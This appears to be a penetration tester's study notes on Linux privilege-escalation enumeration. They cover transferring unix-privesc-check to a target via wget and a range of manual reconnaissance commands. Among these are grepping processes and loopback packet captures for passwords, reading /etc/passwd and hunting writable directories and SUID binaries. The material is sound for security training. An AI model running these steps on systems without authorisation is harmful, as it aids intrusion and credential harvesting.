# Linux Enumeration

## Automatic Enumeration

### unix-privesc-check

On Kali host:
```bash
cp /usr/bin/unix-privesc-check/unix-privesc-check .
python3 -m http.server
```
On target machine:
```bash
wget http://<our IP>/unix-privesc-check
```
```bash
chmod +x unix-privesc-check
```
```bash
unix-privesc-check standard > output.txt
```
The `output.txt` file is meaty, and in standard mode it isn't complete, but it's a good start. The most obvious thing to do immediately is:
```bash
cat output.txt | grep -A 10 writable
```
This is just a quick start. Worth going over the file carefully if nothing immediately jumps out.

## Manual Enumeration
For fine grained/specific enumeration items see the glossary below. Hopefully a standard privesc check as detailed above should be sufficient, but in case it isn't.

### Misc.
Get context about the current user:
```bash
id
```
Enumerate users on the machine:
```bash
cat /etc/passwd
```
Enumerate the functional role of the machine:
```bash
hostname
```
OS and system version enumeration:
```bash
uname -a
```
alternatives to the same effect:
```bash
cat /etc/os-release
```
```bash
cat /etc/issue
```
Inspect environment variables:
```bash
env
```
Check the .bashrc:
```bash
cat ~/.bashrc
```

### Processes
List running processes:
```bash
ps aux
```
Search running processes for foolishness:
```bash
watch -n 1 "ps -aux | grep pass"
```

### Networking
TCP/IP information:
```bash
ifconfig a
```
Or if you happen to be prodding at a RHEL or Arch machine for some god forsaken reason:
```bash
ip a
```
Network routing information on Debian based systems:
```bash
routel 
```
or if that fails:
```bash
route
```
To see active network connections:
```bash
ss -anp
```
The `iptables` command is unlikely to be available to our peon-tier user by default on account of it being an admin privilege by default. However we may still be able to view some config via:
```bash
cat /etc/iptables/rules.v4
```
Some basic packet capture:
```bash
sudo tcpdump -i lo -A | grep "pass"
```
### Cronjobs
Enumerate cron jobs:
```bash
ls -lah /etc/cron*
```
and the current users scheduled jobs:
```bash
crontab -l
```
Jobs running as root will not appear when querying like this, for that run as root (although its hard to imagine when we might want to do this if we already have root...):
```bash
sudo crontab -l
```
Inspect the cron logs:
```bash
grep "CRON" /var/log/syslog
```

### Packages, Modules & Disks
Packages installed via `dpkg` (Debian package manager):
```bash
dpkg -l
```
List drives mounted at boot time:
```bash
cat /etc/fstab
```
in addition `mount` should tell us everything that's currently mounted:
```bash
mount
```
Available disks:
```bash
lsblk
```
Loaded kernel modules:
```bash
lsmod
```
For more info on a kernel module that we've taken an interest in:
```bash
/sbin/modinfo <intriguing module>
```

### File permissions
```bash
ls -l
```
Find every directory the current user can write to:
```bash
find / -writable -type d 2>/dev/null
```
Find SUID marked binaries:
```bash
find / -perm -u=s -type f 2>/dev/null
```
